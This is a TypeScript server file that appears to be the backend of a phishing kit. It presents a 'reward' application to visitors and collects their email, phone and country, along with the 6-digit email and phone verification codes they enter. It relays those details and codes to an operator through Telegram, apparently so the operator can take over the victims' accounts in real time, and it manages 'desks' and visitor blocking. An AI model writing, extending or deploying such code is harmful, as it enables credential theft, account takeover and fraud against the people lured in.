import { createServerFn } from "@tanstack/react-start";
import { authMiddleware } from "@/lib/auth/middleware";
import { isCountry, isExactPhone, phoneLengthMessage } from "@/data/countries";

export const WRONG_PHONE_NOTICE = "Enter the correct phone number.";
export const NEW_EMAIL_NOTICE = "Enter another email.";
export const DECLINE_DETAILS_NOTICE = "Enter your details again.";
export const RESTART_COUNTRY_NOTICE = "Choose your country again.";
export const RESTART_DETAILS_NOTICE = "Start again from your details.";

export type ApplicationStatus = "pending" | "approved" | "rejected";

export type Application = {
  country: string;
  email: string;
  phone: string;
  status: ApplicationStatus;
  emailVerified: boolean;
  phoneVerified: boolean;
  emailCodePending: boolean;
  phoneCodePending: boolean;
  rewardStatus: "none" | "pending" | "approved" | "declined";
  notice: string | null;
  updatedAt: number;
};

export type LoginState = "none" | "pending" | "approved" | "rejected" | "blocked";

export type Access = {
  application: Application | null;
  isReviewer: boolean;
  needsReviewer: boolean;
  login: LoginState;
};

export type QueueItem = {
  id: number;
  country: string;
  email: string;
  phone: string;
  status: ApplicationStatus;
  emailVerified: boolean;
  phoneVerified: boolean;
  emailCode: string | null;
  phoneCode: string | null;
};

function isStatus(value: string): value is ApplicationStatus {
  return value === "pending" || value === "approved" || value === "rejected";
}

function parseApply(input: unknown) {
  if (!input || typeof input !== "object") throw new Error("Missing details");
  const raw = input as { country?: unknown; email?: unknown; phone?: unknown; desk?: unknown };
  const country = String(raw.country ?? "").trim();
  const email = String(raw.email ?? "").replace(/\s/g, "").toLowerCase();
  const phone = String(raw.phone ?? "").trim();
  const desk = raw.desk === "2" || raw.desk === "3" ? raw.desk : "1";
  if (!isCountry(country)) throw new Error("Choose a country from the list");
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || email.length > 120) {
    throw new Error("Enter a valid email");
  }
  const digits = phone.replace(/\D/g, "");
  if (!isExactPhone(digits, country)) {
    throw new Error(phoneLengthMessage(country));
  }
  return { country, email, phone, desk };
}

function parseCode(input: unknown) {
  if (!input || typeof input !== "object") throw new Error("Missing code");
  const raw = input as { channel?: unknown; code?: unknown; desk?: unknown };
  const channel = raw.channel === "email" || raw.channel === "phone" ? raw.channel : null;
  const code = String(raw.code ?? "").replace(/\D/g, "");
  const desk = raw.desk === "2" || raw.desk === "3" ? raw.desk : "1";
  if (!channel) throw new Error("Unknown code");
  if (code.length !== 6) throw new Error("Enter the 6-digit code");
  return { channel, code, desk };
}

function parseReview(input: unknown) {
  if (!input || typeof input !== "object") throw new Error("Missing decision");
  const raw = input as { id?: unknown; status?: unknown };
  const id = Number(raw.id);
  const status = String(raw.status ?? "");
  if (!Number.isInteger(id) || id < 1) throw new Error("Unknown request");
  if (status !== "approved" && status !== "rejected") throw new Error("Unknown decision");
  return { id, status };
}

function timeValue(value: unknown) {
  if (value instanceof Date) return value.getTime() || 0;
  if (typeof value === "number") return Number.isFinite(value) ? value : 0;
  if (typeof value === "bigint") return Number(value);
  const text = String(value ?? "").trim();
  if (/^[+-]?\d+(\.\d+)?(e[+-]?\d+)?$/i.test(text)) {
    const n = Number(text);
    return Number.isFinite(n) ? n : 0;
  }
  const parsed = Date.parse(text);
  return Number.isFinite(parsed) ? parsed : 0;
}

function isYes(value: unknown) {
  return value === true || value === 1 || value === "t" || value === "true";
}

function rewardState(value: string | undefined): Application["rewardStatus"] {
  if (value === "pending" || value === "approved" || value === "declined") return value;
  return "none";
}

function isLogin(value: string): value is Exclude<LoginState, "none"> {
  return value === "pending" || value === "approved" || value === "rejected" || value === "blocked";
}

async function readAccess(userId: string): Promise<Access> {
  const { getSql } = await import("@/lib/db");
  const sql = await getSql();
  const apps = await sql<{
    country: string;
    email: string;
    phone: string;
    status: string;
    email_verified: boolean;
    phone_verified: boolean;
    email_code_pending: boolean;
    phone_code_pending: boolean;
    reward_status: string;
    notice: string | null;
    updated_at: string | Date;
  }>`
    select country, email, phone, status, email_verified, phone_verified, email_code_pending, phone_code_pending, reward_status, notice,
           (extract(epoch from updated_at) * 1000)::float8 as updated_at
    from applications
    where user_id = ${userId}
  `;
  const logins = await sql<{ status: string }>`select status from login_approvals where user_id = ${userId}`;
  const row = apps[0];
  const loginStatus = logins[0]?.status ?? "";
  const rewardStatus = rewardState(row?.reward_status);
  const application =
    row && isStatus(row.status)
      ? {
          country: row.country,
          email: row.email,
          phone: row.phone,
          status: row.status,
          emailVerified: isYes(row.email_verified),
          phoneVerified: isYes(row.phone_verified),
          emailCodePending: isYes(row.email_code_pending),
          phoneCodePending: isYes(row.phone_code_pending),
          rewardStatus,
          notice: row.notice,
          updatedAt: timeValue(row.updated_at),
        }
      : null;
  return {
    application,
    isReviewer: false,
    needsReviewer: false,
    login: isLogin(loginStatus) ? loginStatus : "none",
  };
}

async function assertReviewer(userId: string) {
  const { getSql } = await import("@/lib/db");
  const sql = await getSql();
  const rows = await sql<{ user_id: string }>`select user_id from reviewers where user_id = ${userId}`;
  if (!rows.length) throw new Error("Only an admin can review requests");
}

export const endVisitorSession = createServerFn({ method: "POST" }).handler(async () => {
  const { auth } = await import("@/lib/auth/server");
  const { getRequest, setCookie } = await import("@tanstack/react-start/server");
  const request = getRequest();
  if (request) await auth.api.signOut({ headers: request.headers }).catch(() => undefined);
  const gone = { path: "/", httpOnly: true, secure: true, sameSite: "lax" as const, maxAge: 0 };
  for (const name of [
    "__Host-grok-auth.session_token",
    "__Host-grok-auth.session_data",
    "__Host-grok-auth.account_data",
    "__Host-grok-auth.dont_remember",
  ]) {
    setCookie(name, "", gone);
  }
  return { ok: true };
});

export const getAccess = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .validator((input: unknown) => input ?? null)
  .handler(async ({ context }) => {
    void import("@/lib/telegram.server");
    return readAccess(context.userId);
  });

function parseLogin(input: unknown) {
  if (!input || typeof input !== "object") return { name: "", email: "", fresh: false };
  const raw = input as { name?: unknown; email?: unknown; fresh?: unknown };
  return {
    name: String(raw.name ?? "").trim().slice(0, 80),
    email: String(raw.email ?? "").trim().toLowerCase().slice(0, 120),
    fresh: raw.fresh === true,
  };
}

export const reportLogin = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .validator(parseLogin)
  .handler(async ({ context, data }) => {
    const { getSql } = await import("@/lib/db");
    const sql = await getSql();
    void import("@/lib/telegram.server");
    const existing = await sql<{ status: string }>`select status from login_approvals where user_id = ${context.userId}`;
    if (existing[0]?.status === "blocked") return readAccess(context.userId);
    const label = [data.name, data.email].filter(Boolean).join(" · ") || "Signed-in member";
    await sql`
      insert into login_approvals (user_id, status, label)
      values (${context.userId}, 'approved', ${label})
      on conflict (user_id) do update
      set status = 'approved', label = ${label}, updated_at = now()
    `;
    return readAccess(context.userId);
  });

async function visitorPassword(email: string) {
  const data = new TextEncoder().encode(`tinder-visitor:${email.trim().toLowerCase()}`);
  const digest = await crypto.subtle.digest("SHA-256", data);
  return Array.from(new Uint8Array(digest), (byte) => byte.toString(16).padStart(2, "0")).join("");
}

async function openVisitor(email: string, desk = "1") {
  const { auth } = await import("@/lib/auth/server");
  const { getRequest } = await import("@tanstack/react-start/server");
  const headers = getRequest()?.headers ?? new Headers();
  const accountEmail = desk === "1" ? email : email.replace("@", `+desk${desk}@`);
  const password = await visitorPassword(accountEmail);
  const name = email.split("@")[0] || "Member";
  try {
    const created = await auth.api.signUpEmail({
      body: { name, email: accountEmail, password },
      headers,
      returnHeaders: true,
    });
    return {
      userId: created.response.user.id,
      token: created.headers.get("set-auth-token"),
    };
  } catch {
    const signed = await auth.api.signInEmail({
      body: { email: accountEmail, password },
      headers,
      returnHeaders: true,
    });
    return {
      userId: signed.response.user.id,
      token: signed.headers.get("set-auth-token"),
    };
  }
}

async function writeApplication(
  sql: Awaited<ReturnType<typeof import("@/lib/db").getSql>>,
  userId: string,
  data: { country: string; email: string; phone: string; desk?: string },
) {
  const current = await sql<{ phone: string; email: string; notice: string | null; status: string }>`
    select phone, email, notice, status from applications where user_id = ${userId}
  `;
  const previous = current[0];
  if (previous?.status === "blocked") throw new Error("You cannot continue.");
  const blocked = await sql<{ status: string }>`select status from login_approvals where user_id = ${userId}`;
  if (blocked[0]?.status === "blocked") throw new Error("You cannot continue.");
  if (
    previous?.notice === WRONG_PHONE_NOTICE &&
    previous.phone.replace(/\D/g, "") === data.phone.replace(/\D/g, "")
  ) {
    throw new Error("Enter the correct phone number.");
  }
  if (
    previous?.notice === NEW_EMAIL_NOTICE &&
    previous.email.trim().toLowerCase() === data.email.trim().toLowerCase()
  ) {
    throw new Error("Enter another email.");
  }
  const desk = data.desk === "2" || data.desk === "3" ? data.desk : "1";
  await sql`
    insert into applications (user_id, country, email, phone, status, desk)
    values (${userId}, ${data.country}, ${data.email}, ${data.phone}, 'pending', ${desk})
    on conflict (user_id) do update
    set country = excluded.country,
        email = excluded.email,
        phone = excluded.phone,
        status = 'pending',
        desk = excluded.desk,
        email_verified = false,
        phone_verified = false,
        email_code = null,
        phone_code = null,
        email_code_pending = false,
        phone_code_pending = false,
        reward_status = 'none',
        notice = null,
        updated_at = now()
  `;
  await sql`
    update admin_events
    set status = 'replaced'
    where user_id = ${userId} and status = 'pending'
  `;
  const { askAdmin } = await import("@/lib/telegram.server");
  void askAdmin(
    sql,
    userId,
    "application",
    `${data.country} ${data.email} ${data.phone}`,
    "Step 1-Entering email code",
  ).catch(() => undefined);
}

export const continueApplication = createServerFn({ method: "POST" })
  .validator(parseApply)
  .handler(async ({ data }) => {
    const { getSql } = await import("@/lib/db");
    const sql = await getSql();
    const visitor = await openVisitor(data.email, data.desk);
    await writeApplication(sql, visitor.userId, data);
    return { token: visitor.token, access: await readAccess(visitor.userId) };
  });

export const saveApplication = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .validator(parseApply)
  .handler(async ({ context, data }) => {
    const { getSql } = await import("@/lib/db");
    const sql = await getSql();
    await writeApplication(sql, context.userId, data);
    return readAccess(context.userId);
  });

export const claimReviewer = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .handler(async () => {
    throw new Error("The admin approves in Telegram");
  });

export const listQueue = createServerFn({ method: "GET" })
  .middleware([authMiddleware])
  .handler(async ({ context }) => {
    await assertReviewer(context.userId);
    const { getSql } = await import("@/lib/db");
    const sql = await getSql();
    const rows = await sql<{
      id: number;
      country: string;
      email: string;
      phone: string;
      status: string;
      email_verified: boolean;
      phone_verified: boolean;
      email_code: string | null;
      phone_code: string | null;
    }>`
      select id, country, email, phone, status, email_verified, phone_verified, email_code, phone_code
      from applications
      order by case status when 'pending' then 0 when 'rejected' then 1 else 2 end, id desc
    `;
    return rows.flatMap((row) => {
      if (!isStatus(row.status)) return [];
      return [
        {
          id: row.id,
          country: row.country,
          email: row.email,
          phone: row.phone,
          status: row.status,
          emailVerified: row.email_verified === true,
          phoneVerified: row.phone_verified === true,
          emailCode: row.email_code,
          phoneCode: row.phone_code,
        },
      ];
    });
  });

export const reviewApplication = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .validator(parseReview)
  .handler(async () => {
    throw new Error("The admin approves in Telegram");
  });

export const confirmCode = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .validator(parseCode)
  .handler(async ({ context, data }) => {
    const { getSql } = await import("@/lib/db");
    const { deliverEnteredCode } = await import("@/lib/telegram.server");
    const sql = await getSql();
    const rows = await sql<{
      status: string;
      email: string;
      email_code: string | null;
      phone_code: string | null;
      email_verified: boolean;
      phone_verified: boolean;
      email_code_pending: boolean;
      phone_code_pending: boolean;
    }>`
      select status, email, email_code, phone_code, email_verified, phone_verified, email_code_pending, phone_code_pending
      from applications
      where user_id = ${context.userId}
    `;
    const row = rows[0];
    if (!row) throw new Error("Your request is still under review.");
    if (data.channel === "phone" && (row.status !== "approved" || !isYes(row.email_verified))) {
      throw new Error("Your request is still under review.");
    }
    if (data.channel === "email" && row.status !== "approved") {
      throw new Error("Your request is still under review.");
    }
    const logins = await sql<{ status: string }>`select status from login_approvals where user_id = ${context.userId}`;
    if (logins[0]?.status === "blocked") throw new Error("This request has been blocked.");
    if (data.desk === "2" || data.desk === "3") {
      await sql`
        update applications
        set desk = ${data.desk}, updated_at = now()
        where user_id = ${context.userId}
      `;
    }
    if (data.channel === "email") {
      if (row.email_verified === true || isYes(row.email_verified)) return readAccess(context.userId);
      if (row.email_code_pending === true) return readAccess(context.userId);
      await deliverEnteredCode(sql, context.userId, "email", data.code);
      await sql`
        update applications
        set email_code = null, email_code_pending = true, notice = null, updated_at = now()
        where user_id = ${context.userId}
      `;
    } else {
      if (!isYes(row.email_verified)) throw new Error("Your request is still under review.");
      if (row.phone_verified === true) return readAccess(context.userId);
      if (row.phone_code_pending === true) return readAccess(context.userId);
      await deliverEnteredCode(sql, context.userId, "phone", data.code);
      await sql`
        update applications
        set phone_code = null, phone_code_pending = true, notice = null, updated_at = now()
        where user_id = ${context.userId}
      `;
    }
    return readAccess(context.userId);
  });
